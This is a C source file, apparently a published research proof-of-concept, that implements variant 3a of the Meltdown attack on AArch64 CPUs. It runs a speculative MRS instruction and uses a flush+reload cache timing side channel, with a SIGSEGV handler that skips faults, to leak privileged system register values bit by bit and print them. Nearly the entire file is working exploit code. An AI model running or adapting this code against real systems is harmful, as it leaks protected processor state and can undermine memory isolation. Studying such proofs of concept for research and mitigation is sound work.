/*
  Copyright (c) 2018, Cosmin Gorgovan <code at cosmin.me.uk>
  All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:
      * Redistributions of source code must retain the above copyright
        notice, this list of conditions and the following disclaimer.
      * Redistributions in binary form must reproduce the above copyright
        notice, this list of conditions and the following disclaimer in the
        documentation and/or other materials provided with the distribution.
      * Neither the name of the copyright holder nor the
        names of its contributors may be used to endorse or promote products
        derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
  ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY
  DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
  LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
  ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

/*
  PoC code implementing variant 3a of the Meltdown attack for AArch64
  See the ARM whitepaper at: https://developer.arm.com/support/security-update

  Tested on Cortex-A57 and Cortex-A72.
*/

#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <assert.h>
#include <pthread.h>
#include <signal.h>
#include <sys/mman.h>
#include <string.h>
#include <stdbool.h>

typedef struct {
  uint32_t op0;
  uint32_t op1;
  uint32_t crn;
  uint32_t crm;
  uint32_t op2;
  char *name;
} sysreg;

#include "sregs.h"

volatile uint64_t counter = 0;
volatile int read_bit;
uint8_t *probe;
uintptr_t *zrbf;
uint32_t *codebuf;
uint64_t miss_min;

#define probe_stride (4 * 1024)
const size_t probe_size = 2 * probe_stride;
#define zrbf_stride (4 * 1024/sizeof(uintptr_t))
const size_t zrbf_size = 10 * zrbf_stride * sizeof(uintptr_t);

typedef void (*spec_read_fn)(void *probe_buf, void *miss_buf, uint64_t bit);
spec_read_fn do_spec_read;
extern void spec_read(void *probe_buf, void *miss_buf, uint64_t bit);

uint64_t timed_read(uint8_t *addr) {
  uint64_t ns = counter;

  asm volatile (
    "DSB SY\n"
    "LDR X5, [%[ad]]\n"
    "DSB SY\n"
    : : [ad] "r" (addr) : "x5");

  return counter-ns;
}

void flush(void *addr, size_t n, size_t stride) {
  for (int i = 0; i < n; i+= 1) {
    asm volatile ("DC CIVAC, %[ad]" : : [ad] "r" (addr));
    addr += stride;
  }
  asm volatile("DSB SY");
}

void *inc_counter(void *a) {
  while(1) {
    counter++;
    asm volatile ("DMB SY");
  }
}

void get_value(int i, siginfo_t *info, void *ctx) {
  read_bit = 0;
  uint64_t ns = timed_read(&probe[probe_stride]);
  if (ns < miss_min && ns > 0) {
    read_bit = 1;
  } else {
    uint64_t ns2 = timed_read(&probe[0]);
    if (ns2 >= miss_min || ns2 == 0) {
      read_bit = -1;
    }
  }

  ucontext_t *c = (ucontext_t *)ctx;
  c->uc_mcontext.pc += 24;
}

uint32_t get_mrs(uint64_t op0, uint64_t op1, uint64_t crn, uint64_t crm, uint64_t op2) {
  uint32_t opcode = 0xd5300000;
  opcode |= (op0 & 0x1) << 19;
  opcode |= (op1 & 0x7) << 16;
  opcode |= (crn & 0xF) << 12;
  opcode |= (crm & 0xF) << 8;
  opcode |= (op2 & 0x7) << 5;
  opcode |= 3; // Rt
  return opcode;
}

void spec_read_wrapper(void *probe, void *miss_buf, uint64_t bit) {
  flush(probe, 2, probe_stride);
  flush(zrbf, 5, zrbf_stride*sizeof(uintptr_t));
  do_spec_read(probe, miss_buf, bit);
}

#define CODE_SIZE 100
int read_register(uint64_t *val, uint32_t op0, uint32_t op1, uint32_t crn, uint32_t crm, uint32_t op2) {
  memcpy(codebuf, spec_read, CODE_SIZE);
  assert(codebuf[5] == 0xd503201f);
  codebuf[5] = get_mrs(op0, op1, crn, crm, op2);
  __clear_cache(codebuf, codebuf + CODE_SIZE + 1);
  
  int timeout = 20000;

  uint64_t cur_value = 0;
  for (uint64_t bit = 0; bit < 64; bit++) {
    bool valid = false;
    int prev_bit;

    do {
      do {
        spec_read_wrapper(probe, &zrbf[zrbf_stride*3], bit);
        prev_bit = read_bit;
        timeout--;
      } while (prev_bit < 0 && timeout > 0);

      valid = true;
      for (int r = 0; r < 10 && valid; r++) {
        spec_read_wrapper(probe, &zrbf[zrbf_stride*3], bit);
        if (read_bit != prev_bit) {
          valid = false;
        }
        timeout--;
      }
    } while (!valid && timeout > 0);
    if (read_bit >= 0) {
      cur_value |= ((uint64_t)read_bit) << bit;
    }
  }
  *val = cur_value;

  if (timeout <= 0) return -1;
  return 0;
}

void read_registers() {
  for (int i = 0; i < 160; i++) {
    uint64_t val;
    int ret = read_register(&val, sysregs[i].op0, sysregs[i].op1, sysregs[i].crn,
                                   sysregs[i].crm, sysregs[i].op2);
    printf("%-20s: 0x%lx %s\n", sysregs[i].name, val, (ret == 0) ? "" : "(dynamic?)");
  }
}

uint64_t measure_latency() {
  uint64_t ns;
  uint64_t min = 0xFFFFF;

  for (int r = 0; r < 300; r++) {
    flush(probe, 2, probe_stride);
    ns = timed_read(&probe[0]);
    if (ns < min) min = ns;
  }

  return min;
}

int main() {
  struct sigaction act;
  act.sa_sigaction = get_value;
  sigemptyset(&act.sa_mask);
  act.sa_flags = SA_SIGINFO;
  sigaction(SIGSEGV, &act, NULL);

  codebuf = mmap(NULL, 4096, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  assert(codebuf != MAP_FAILED);
  do_spec_read = (spec_read_fn)codebuf;

  probe = mmap(NULL, probe_size, PROT_READ | PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  assert(probe != MAP_FAILED);

  zrbf = mmap(NULL, zrbf_size, PROT_READ | PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  assert(zrbf != MAP_FAILED);
  zrbf[0] = 0;

  // set up the dereference chain used to stall execution
  for (int i = 1; i < 10; i++) {
    zrbf[i*zrbf_stride] = (uintptr_t)&zrbf[(i-1)*zrbf_stride];
  }

  // trigger CoW on the probe pages
  for (int i = 0; i < probe_size; i += probe_stride) {
    probe[i] = 1;
  }

  pthread_t inc_counter_thread;
  if(pthread_create(&inc_counter_thread, NULL, inc_counter, NULL)) {
    fprintf(stderr, "Error creating thread\n");
    return 1;
  }
  while(counter == 0);
  asm volatile ("DSB SY");

  miss_min = measure_latency();
  if (miss_min == 0) {
    fprintf(stderr, "Unreliable access timing\n");
    exit(EXIT_FAILURE);
  }
  miss_min -=1;

  read_registers();

  return 0;
}
